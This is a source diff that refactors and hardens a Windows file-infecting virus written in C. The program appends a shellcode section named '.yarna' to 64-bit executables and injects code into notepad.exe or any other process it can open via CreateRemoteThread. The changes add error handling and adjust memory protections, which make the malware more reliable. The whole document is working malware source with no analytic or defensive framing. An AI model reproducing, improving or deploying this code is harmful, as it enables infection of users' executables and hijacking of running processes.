@@ -4,10 +4,17 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stddef.h>
-#include <tlhelp32.h>
 #include <stdint.h>
 #include <synchapi.h> 
 #define VIRUS_SECTION_NAME ".yarna"
+#define TARGET_PROCESS_NAME "notepad.exe"
+
+// Conditional debug logging
+#ifdef _DEBUG
+#define DEBUG_PRINT(fmt, ...) printf("[DEBUG] " fmt, ##__VA_ARGS__)
+#else
+#define DEBUG_PRINT(fmt, ...) do {} while (0)
+#endif
 
 typedef LONG NTSTATUS;
 #define STATUS_SUCCESS ((NTSTATUS)0)
@@ -47,9 +54,9 @@ typedef NTSTATUS(NTAPI* NtMapViewOfSectionPtr)(HANDLE, HANDLE, PVOID*, ULONG_PTR
 typedef NTSTATUS(NTAPI* RtlCreateUserThreadPtr)(HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PCLIENT_ID);
 typedef NTSTATUS(NTAPI* ZwUnmapViewOfSectionPtr)(HANDLE, PVOID);
 
-BOOL InfectFile(const char* path);
-DWORD FindTargetPid(const char* name);
-BOOL InjectPid(DWORD pid);
+static BOOL InfectFile(const char* path);
+static DWORD FindTargetPid(const char* name);
+static BOOL InjectPid(DWORD pid);
 static uintptr_t GetRemoteModuleBase(DWORD pid, const char* modName);
 
 /**
@@ -88,13 +95,25 @@ static void* LoadShellcode(DWORD* outSize) {
     HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(101), RT_RCDATA);
     printf("[DEBUG] LoadShellcode: FindResource -> 0x%p, GLE=0x%08X\n", hRes, GetLastError());
     if (!hRes) return NULL;
+    
     HGLOBAL hData = LoadResource(NULL, hRes);
     printf("[DEBUG] LoadShellcode: LoadResource -> 0x%p, GLE=0x%08X\n", hData, GetLastError());
     if (!hData) return NULL;
+    
     DWORD size = SizeofResource(NULL, hRes);
     printf("[DEBUG] LoadShellcode: SizeofResource -> %lu\n", size);
+    if (size == 0) {
+        printf("[ERROR] LoadShellcode: Invalid shellcode size\n");
+        return NULL;
+    }
+    
     void* ptr = LockResource(hData);
     printf("[DEBUG] LoadShellcode: LockResource -> 0x%p\n", ptr);
+    if (!ptr) {
+        printf("[ERROR] LoadShellcode: LockResource failed\n");
+        return NULL;
+    }
+    
     if (outSize) *outSize = size;
     printf("[DEBUG] LoadShellcode: exit\n");
 
@@ -194,18 +213,18 @@ static DWORD AlignUp(DWORD val, DWORD align) {
  */
 static uintptr_t GetRemoteModuleBase(DWORD pid, const char* modName) {
     MODULEENTRY32 me = { sizeof(me) };
-    HANDLE hSnap = CreateToolhelp32Snapshot(
+    HANDLE moduleSnapshot = CreateToolhelp32Snapshot(
         TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32,
         pid
     );
-    if (hSnap == INVALID_HANDLE_VALUE) {
+    if (moduleSnapshot == INVALID_HANDLE_VALUE) {
         printf("[ERROR] SnapModules(%u) failed: %u\n", pid, GetLastError());
         return 0;
     }
 
-    if (!Module32First(hSnap, &me)) {
+    if (!Module32First(moduleSnapshot, &me)) {
         printf("[ERROR] Module32First(%u) failed: %u\n", pid, GetLastError());
-        CloseHandle(hSnap);
+        CloseHandle(moduleSnapshot);
         return 0;
     }
 
@@ -214,12 +233,12 @@ static uintptr_t GetRemoteModuleBase(DWORD pid, const char* modName) {
             me.szModule, me.modBaseAddr);
         if (_stricmp(me.szModule, modName) == 0) {
             uintptr_t base = (uintptr_t)me.modBaseAddr;
-            CloseHandle(hSnap);
+            CloseHandle(moduleSnapshot);
             return base;
         }
-    } while (Module32Next(hSnap, &me));
+    } while (Module32Next(moduleSnapshot, &me));
 
-    CloseHandle(hSnap);
+    CloseHandle(moduleSnapshot);
     return 0;
 }
 
@@ -289,7 +308,17 @@ static BOOL InjectPid(DWORD pid) {
     SIZE_T  msgLen = sizeof(msg);
     LPVOID  remoteMsg = VirtualAllocEx(hProc, NULL, msgLen,
         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    WriteProcessMemory(hProc, remoteMsg, msg, msgLen, &msgLen);
+    if (!remoteMsg) {
+        printf(" [ERROR] VirtualAllocEx for message failed: %lu\n", GetLastError());
+        CloseHandle(hProc);
+        return FALSE;
+    }
+    
+    if (!WriteProcessMemory(hProc, remoteMsg, msg, msgLen, &msgLen)) {
+        printf(" [ERROR] WriteProcessMemory for message failed: %lu\n", GetLastError());
+        CloseHandle(hProc);
+        return FALSE;
+    }
     printf(" [DEBUG] wrote %zu bytes to remoteMsg=%p\n", msgLen, remoteMsg);
 
     HMODULE u32 = LoadLibraryA("user32.dll");
@@ -337,11 +366,29 @@ static BOOL InjectPid(DWORD pid) {
     }
     printf("\n");
 
-    // write & execute stub
+    // write & execute stub with better security practices
+    // First allocate as PAGE_READWRITE, then change to PAGE_EXECUTE_READ
     LPVOID remoteThunk = VirtualAllocEx(hProc, NULL, 64,
-        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    WriteProcessMemory(hProc, remoteThunk, stub, 64, NULL);
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remoteThunk) {
+        printf(" [ERROR] VirtualAllocEx failed: %lu\n", GetLastError());
+        CloseHandle(hProc);
+        return FALSE;
+    }
+    
+    if (!WriteProcessMemory(hProc, remoteThunk, stub, 64, NULL)) {
+        printf(" [ERROR] WriteProcessMemory failed: %lu\n", GetLastError());
+        CloseHandle(hProc);
+        return FALSE;
+    }
     printf(" [DEBUG] Wrote stub to remoteThunk=%p\n", remoteThunk);
+    
+    // Change memory protection to execute+read only
+    DWORD oldProtect;
+    if (!VirtualProtectEx(hProc, remoteThunk, 64, PAGE_EXECUTE_READ, &oldProtect)) {
+        printf(" [WARN] VirtualProtectEx failed: %lu\n", GetLastError());
+        // Continue anyway as some processes might still work
+    }
 
     HANDLE hTh = CreateRemoteThread(
         hProc, NULL, 0,
@@ -370,38 +417,52 @@ static BOOL InjectPid(DWORD pid) {
 static DWORD FindTargetPid(const char* name) {
     printf("[DEBUG] FindTargetPid: entry name=%s\n", name ? name : "<NULL>");
     PROCESSENTRY32 pe = { sizeof(pe) };
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) { printf("[ERROR] FindTargetPid: Snapshot failed\n"); return 0; }
+    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (processSnapshot == INVALID_HANDLE_VALUE) { 
+        printf("[ERROR] FindTargetPid: Snapshot failed\n"); 
+        return 0; 
+    }
     DWORD pid = 0;
-    char selfName[MAX_PATH]; GetModuleFileNameA(NULL, selfName, MAX_PATH);
-    char* base = strrchr(selfName, '\\'); base = base ? base + 1 : selfName;
+    char selfName[MAX_PATH]; 
+    GetModuleFileNameA(NULL, selfName, MAX_PATH);
+    char* base = strrchr(selfName, '\\'); 
+    base = base ? base + 1 : selfName;
+    
     if (name) {
-        while (Process32Next(hSnap, &pe)) {
+        while (Process32Next(processSnapshot, &pe)) {
             printf("[DEBUG] FindTargetPid: checking %s (PID=%u)\n", pe.szExeFile, pe.th32ProcessID);
-            if (!_stricmp(pe.szExeFile, name)) { pid = pe.th32ProcessID; break; }
+            if (!_stricmp(pe.szExeFile, name)) { 
+                pid = pe.th32ProcessID; 
+                break; 
+            }
         }
     }
     if (!pid) {
-        while (Process32Next(hSnap, &pe)) {
+        while (Process32Next(processSnapshot, &pe)) {
             if (pe.th32ProcessID <= 4) continue;
             if (!_stricmp(pe.szExeFile, base)) continue;
             HANDLE hTest = OpenProcess(PROCESS_CREATE_THREAD, FALSE, pe.th32ProcessID);
-            if (hTest) { pid = pe.th32ProcessID; printf("[DEBUG] FindTargetPid: fallback %s (PID=%u)\n", pe.szExeFile, pid); CloseHandle(hTest); break; }
+            if (hTest) { 
+                pid = pe.th32ProcessID; 
+                printf("[DEBUG] FindTargetPid: fallback %s (PID=%u)\n", pe.szExeFile, pid); 
+                CloseHandle(hTest); 
+                break; 
+            }
         }
     }
-    CloseHandle(hSnap);
+    CloseHandle(processSnapshot);
     printf("[DEBUG] FindTargetPid: exit -> %u\n", pid);
     return pid;
 }
 
 /**
- * \fn int InfectFile(const char* path)
+ * \fn static BOOL InfectFile(const char* path)
  * \brief Append a new section to a PE file and inject shellcode into it.
  *
  * \param path File path of the target PE executable.
- * \return 1 on successful infection, 0 on failure or if already infected.
+ * \return TRUE on successful infection, FALSE on failure or if already infected.
  */
-int InfectFile(const char* path) {
+static BOOL InfectFile(const char* path) {
     printf("[DEBUG] InfectFile: path=%s\n", path);
 
     HANDLE hFile = CreateFileA(
@@ -415,7 +476,7 @@ int InfectFile(const char* path) {
     );
     if (hFile == INVALID_HANDLE_VALUE) {
         printf("[ERROR] CreateFileA(%s) failed: 0x%08X\n", path, GetLastError());
-        return 0;
+        return FALSE;
     }
 
     IMAGE_DOS_HEADER dos;
@@ -423,12 +484,12 @@ int InfectFile(const char* path) {
     if (!ReadFile(hFile, &dos, sizeof(dos), &rd, NULL) || rd != sizeof(dos)) {
         printf("[ERROR] ReadFile DOS header failed\n");
         CloseHandle(hFile);
-        return 0;
+        return FALSE;
     }
     if (dos.e_magic != IMAGE_DOS_SIGNATURE) {
         printf("[DEBUG] Not a PE file: %s\n", path);
         CloseHandle(hFile);
-        return 0;
+        return FALSE;
     }
 
     SetFilePointer(hFile, dos.e_lfanew, NULL, FILE_BEGIN);
@@ -436,12 +497,12 @@ int InfectFile(const char* path) {
     if (!ReadFile(hFile, &nt, sizeof(nt), &rd, NULL) || rd != sizeof(nt)) {
         printf("[ERROR] ReadFile NT headers failed\n");
         CloseHandle(hFile);
-        return 0;
+        return FALSE;
     }
     if (nt.Signature != IMAGE_NT_SIGNATURE || nt.FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
         printf("[DEBUG] Unsupported PE type: %s\n", path);
         CloseHandle(hFile);
-        return 0;
+        return FALSE;
     }
 
     WORD nsec = nt.FileHeader.NumberOfSections;
@@ -450,19 +511,24 @@ int InfectFile(const char* path) {
     if (!secs) {
         printf("[ERROR] malloc failed\n");
         CloseHandle(hFile);
-        return 0;
+        return FALSE;
     }
 
     SetFilePointer(hFile, dos.e_lfanew + offsetof(IMAGE_NT_HEADERS64, OptionalHeader) + optSize,
         NULL, FILE_BEGIN);
-    ReadFile(hFile, secs, nsec * sizeof(*secs), &rd, NULL);
+    if (!ReadFile(hFile, secs, nsec * sizeof(*secs), &rd, NULL) || rd != nsec * sizeof(*secs)) {
+        printf("[ERROR] ReadFile section headers failed\n");
+        free(secs);
+        CloseHandle(hFile);
+        return FALSE;
+    }
 
     for (WORD i = 0; i < nsec; i++) {
         if (!_stricmp((char*)secs[i].Name, VIRUS_SECTION_NAME)) {
             printf("[DEBUG] Already infected: %s\n", path);
             free(secs);
             CloseHandle(hFile);
-            return 0;
+            return FALSE;
         }
     }
 
@@ -483,7 +549,7 @@ int InfectFile(const char* path) {
         printf("[ERROR] LoadShellcode in InfectFile failed\n");
         free(secs);
         CloseHandle(hFile);
-        return 0;
+        return FALSE;
     }
 
     newSec.Misc.VirtualSize = shellSize;
@@ -518,7 +584,7 @@ int InfectFile(const char* path) {
     printf("[DEBUG] Successfully infected: %s\n", path);
     free(secs);
     CloseHandle(hFile);
-    return 1;
+    return TRUE;
 }
 
 
@@ -547,60 +613,29 @@ int main(void) {
         FindClose(hFind);
     }
 
-    DWORD pid = FindTargetPid("notepad.exe");
+    DWORD pid = FindTargetPid(TARGET_PROCESS_NAME);
     if (pid) {
-        printf("[DEBUG] Found notepad.exe (PID=%u), injecting...\n", pid);
+        printf("[DEBUG] Found %s (PID=%u), injecting...\n", TARGET_PROCESS_NAME, pid);
         if (InjectPid(pid)) {
-            printf("[DEBUG] Injection succeeded for notepad.exe (PID=%u)\n", pid);
+            printf("[DEBUG] Injection succeeded for %s (PID=%u)\n", TARGET_PROCESS_NAME, pid);
             goto done;
         }
         else {
-            printf("[WARN] Injection failed for notepad.exe (PID=%u)\n", pid);
+            printf("[WARN] Injection failed for %s (PID=%u)\n", TARGET_PROCESS_NAME, pid);
         }
     }
     /*else {
-        // Launch Notepad if not running
-        STARTUPINFOA si = { sizeof(si) };
-        PROCESS_INFORMATION pi;
-        if (CreateProcessA(
-            "C:\\Windows\\System32\\notepad.exe",
-            NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
-        {
-            WaitForInputIdle(pi.hProcess, 2000 /*ms);
-            if (WaitForInputIdle(pi.hProcess, 2000) == 0) {
-                printf("[DEBUG] Notepad is idle, injecting (PID=%u)…\n", pi.dwProcessId);
-            }
-            else {
-                            // fallback small sleep if WaitForInputIdle times out
-                Sleep(500);
-                printf("[DEBUG] Fallback sleep done, injecting (PID=%u)…\n", pi.dwProcessId);
-                
-            }
-             if (InjectPid(pi.dwProcessId)) {
-                printf("[DEBUG] Injection succeeded for new notepad.exe (PID=%u)\n", pi.dwProcessId);
-                CloseHandle(pi.hThread);
-                CloseHandle(pi.hProcess);
-                goto done;
-            }
-            else {
-                printf("[WARN] Injection failed for new notepad.exe (PID=%u)\n", pi.dwProcessId);
-            }
-            CloseHandle(pi.hThread);
-            CloseHandle(pi.hProcess);
-        }
-        else {
-            printf("[WARN] Could not launch notepad.exe: %u\n", GetLastError());
-        }
+        printf("[DEBUG] %s not found, attempting fallback injection\n", TARGET_PROCESS_NAME);
     }*/
 
     PROCESSENTRY32 pe = { sizeof(pe) };
-    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (hSnap == INVALID_HANDLE_VALUE) {
+    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (processSnapshot == INVALID_HANDLE_VALUE) {
         printf("[ERROR] Could not snapshot processes\n");
         return 1;
     }
 
-    while (Process32Next(hSnap, &pe)) {
+    while (Process32Next(processSnapshot, &pe)) {
         if (_stricmp(pe.szExeFile, selfName) == 0)
             continue;
         if (InjectPid(pe.th32ProcessID)) {
@@ -609,7 +644,7 @@ int main(void) {
             break;
         }
     }
-    CloseHandle(hSnap);
+    CloseHandle(processSnapshot);
 
 done:
     printf("[DEBUG] Fin \n");
